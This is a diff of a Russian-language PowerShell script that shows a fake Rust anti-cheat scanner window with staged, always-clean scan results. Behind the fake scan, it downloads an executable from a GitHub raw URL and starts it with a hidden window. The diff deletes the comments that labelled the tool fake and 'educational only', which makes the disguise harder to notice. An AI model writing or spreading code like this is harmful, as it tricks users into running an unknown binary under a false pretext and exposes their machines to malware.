@@ -23,14 +23,10 @@ try {
 catch {
 }
 
-# Fake Anti-Cheat Scanner v3.7 для Rust (FAKE EDITION — ЧИСТЫЙ РЕЗУЛЬТАТ)
-# ВСЕГДА показывает "Читы не найдены" в конце.
-# Только для образовательных целей!
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# === Фейковые данные под Rust ===
 $Game = "Rust"
 $FakeCheats = @(
     "RustAim v4.2", "NoRecoil Script", "ESP Box", "FlyHack DLL",
@@ -56,7 +52,7 @@ $form.FormBorderStyle = "FixedDialog"
 $form.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
 $form.ForeColor = [System.Drawing.Color]::Lime
 
-# Логотип
+
 $logo = New-Object System.Windows.Forms.Label
 $logo.Text = @"
   ____        _ _  
@@ -72,14 +68,13 @@ $logo.Location = New-Object System.Drawing.Point(20, 15)
 $logo.ForeColor = [System.Drawing.Color]::Cyan
 $form.Controls.Add($logo)
 
-# Прогресс-бар
+
 $progress = New-Object System.Windows.Forms.ProgressBar
 $progress.Location = New-Object System.Drawing.Point(20, 130)
 $progress.Size = New-Object System.Drawing.Size(620, 25)
 $progress.Style = "Continuous"
 $form.Controls.Add($progress)
 
-# Статус
 $status = New-Object System.Windows.Forms.Label
 $status.Text = "Готов к сканированию..."
 $status.Location = New-Object System.Drawing.Point(20, 165)
@@ -87,7 +82,7 @@ $status.Size = New-Object System.Drawing.Size(620, 20)
 $status.ForeColor = [System.Drawing.Color]::White
 $form.Controls.Add($status)
 
-# Лог (ИСПРАВЛЕНО: Заменено на RichTextBox для поддержки цвета)
+
 $logBox = New-Object System.Windows.Forms.RichTextBox
 $logBox.Multiline = $true
 $logBox.ScrollBars = "Vertical"
@@ -100,7 +95,7 @@ $logBox.ReadOnly = $true
 $logBox.BorderStyle = "None"
 $form.Controls.Add($logBox)
 
-# Кнопка
+
 $btn = New-Object System.Windows.Forms.Button
 $btn.Text = "Запустить сканирование"
 $btn.Location = New-Object System.Drawing.Point(260, 440)
@@ -110,7 +105,7 @@ $btn.ForeColor = [System.Drawing.Color]::White
 $btn.FlatStyle = "Flat"
 $form.Controls.Add($btn)
 
-# === Логирование (ИСПРАВЛЕНО: Добавлен сброс цвета) ===
+
 function Log {
     param([string]$msg, [string]$color = "Lime")
     $timestamp = Get-Date -Format "HH:mm:ss"
@@ -119,12 +114,12 @@ function Log {
     $start = $logBox.TextLength
     $logBox.AppendText($line)
     
-    # Выделяем и красим добавленную строку
+
     $logBox.SelectionStart = $start
     $logBox.SelectionLength = $line.Length
     $logBox.SelectionColor = [System.Drawing.Color]::$color
     
-    # Сбрасываем курсор в конец, чтобы следующий текст не наследовал цвет
+
     $logBox.SelectionStart = $logBox.TextLength
     $logBox.SelectionLength = 0
     $logBox.SelectionColor = $logBox.ForeColor
@@ -138,7 +133,7 @@ function Fake-Delay {
     Start-Sleep -Milliseconds $ms
 }
 
-# === Сканирование ===
+
 $scan = {
     $btn.Enabled = $false
     $progress.Value = 0
@@ -147,7 +142,7 @@ $scan = {
     Log "Запуск Anti-Cheat Scanner для $Game..." "Cyan"
     Fake-Delay 800
 
-    # Этап 1: Процессы
+
     Log "Этап 1/5: Сканирование запущенных процессов..."
     $progress.Value = 15
     Fake-Delay 1200
@@ -156,7 +151,7 @@ $scan = {
     Log "Подозрительные процессы не обнаружены." "Lime"
     $progress.Value = 30
 
-    # Этап 2: DLL
+
     Log "Этап 2/5: Анализ загруженных библиотек (DLL)..."
     Fake-Delay 1100
     Log "Сканирование 3 214 модулей в памяти Rust.exe..."
@@ -164,7 +159,7 @@ $scan = {
     Log "Читерские DLL не найдены." "Lime"
     $progress.Value = 50
 
-    # Этап 3: Сигнатуры
+
     Log "Этап 3/5: Поиск сигнатур читов в памяти..."
     Fake-Delay 1300
     Log "Анализ 1 048 576 байт памяти..."
@@ -186,8 +181,7 @@ $scan = {
     Start-Sleep 1
     
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
+
     Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
 
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
@@ -202,9 +196,10 @@ $scan = {
 
 $btn.Add_Click($scan)
 
-# Запуск
+
 
 [void]$form.ShowDialog()
+
 
 
 
